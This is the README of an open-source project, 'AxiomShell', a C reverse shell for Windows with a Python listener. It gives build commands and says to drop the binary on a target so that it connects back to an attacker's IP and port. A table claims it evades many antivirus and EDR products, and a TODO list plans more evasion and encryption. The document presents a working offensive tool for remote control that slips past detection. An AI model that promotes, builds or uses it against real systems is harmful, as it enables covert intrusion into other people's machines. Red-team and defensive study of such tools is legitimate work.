## AxiomShell

C-based reverse shell server and client with ease-of-life builtin commands

![](screenshots/example.png)

AxiomShell is a simple reverse shell in C, coded with sole purpose of avoiding invoking cmd.exe or powershell.exe to execute commands. It starts from the simple idea that cmd.exe, or at least its core functionalities, can be re-implemented in a standalone binary.

## Evasion efficiency
| Solution              | Status         |
|-----------------------|:--------------:|
| Defender AV           |  ✅ - OK       |
| Defender for Endpoint |  ✅ - OK       |
| Symantec EDR          |  ✅ - OK       |
| Kaspersky EDR         |  ✅ - OK       |
| Sophos                |  ⚠️ - Untested |
| Trend Micro           |  ⚠️ - Untested |
| HarfangLab            |  ✅ - OK       |
| WithSecure            |  ⚠️ - Untested |
| Cortex XDR            |  ⚠️ - Untested |
| Sentinel ONE          |  ✅ - OK       |
| Crowdstrike Falcon    |  ✅ - OK       |

TODO list:
- Find and fix the cause of intempestive "Unknown builtin name" error when typing-in a valid BUILTIN name
- Implement encryption between server and client
- Reimplement netstat, whose execution trigger "LOW" detections similarly to whoami.exe

## Building the .exe file
Install build dependencies:
```bash
$ apt-get update
$ apt-get install make mingw-w64
```

Build the binary:
```bash
$ make
Precompiling main.o...                            [OK]
[...]

[COMPILATION SUCCESSFUL]

$ ls AxiomShell.exe
-rwxrwx--- 1 1000 users 394240 Nov  3 17:53 AxiomShell.exe
```

## Installing the python listener
```bash
$ cd ShellClient
$ python3 -m venv .AxiomShell
$ source .AxiomShell/bin/activate
(.AxiomShell) $ python3 -m pip install .
(.AxiomShell) $ AxiomShell 9001

█████╗ ██╗  ██╗██╗ ██████╗ ███╗   ███╗███████╗██╗  ██╗███████╗██╗     ██╗
██╔══██╗╚██╗██╔╝██║██╔═══██╗████╗ ████║██╔════╝██║  ██║██╔════╝██║     ██║
███████║ ╚███╔╝ ██║██║   ██║██╔████╔██║███████╗███████║█████╗  ██║     ██║
██╔══██║ ██╔██╗ ██║██║   ██║██║╚██╔╝██║╚════██║██╔══██║██╔══╝  ██║     ██║
██║  ██║██╔╝ ██╗██║╚██████╔╝██║ ╚═╝ ██║███████║██║  ██║███████╗███████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝

An OK-tier shell re-implementation



[*] AxiomShell Starting up...
[*] Listening on 0.0.0.0:9001...

```

## Usage
Start the python listener on whatever port you wish:
```bash
(.AxiomShell) $ AxiomShell 9001
```

Drop the .exe file on the target and run it, specifying the listener's IP and PORT:
```powershell
PS> .\AxiomShell.exe 192.168.56.1 9001
[...]
```

You should see the connection come in on your listener, and the prompt appear:
```
[...]
[*] Received connection from: ('192.168.56.110', 49738) on port 9001
[*] Receiving process forked successfully
[*] Sending process forked successfully
C:\Users\MALDEV (MALDEV) > whoami
DESKTOP-HL9M8I2\MALDEV

C:\Users\MALDEV (MALDEV) >
```

## Community

Opening issues or pull requests very much welcome.
Suggestions welcome as well.

## License

This software is under GNU GPL 3.0 license (see LICENSE file).
This is a free, copyleft license that allows users to run, study, share, and modify software, provided that all distributed versions and derivatives remain open source under the same license.

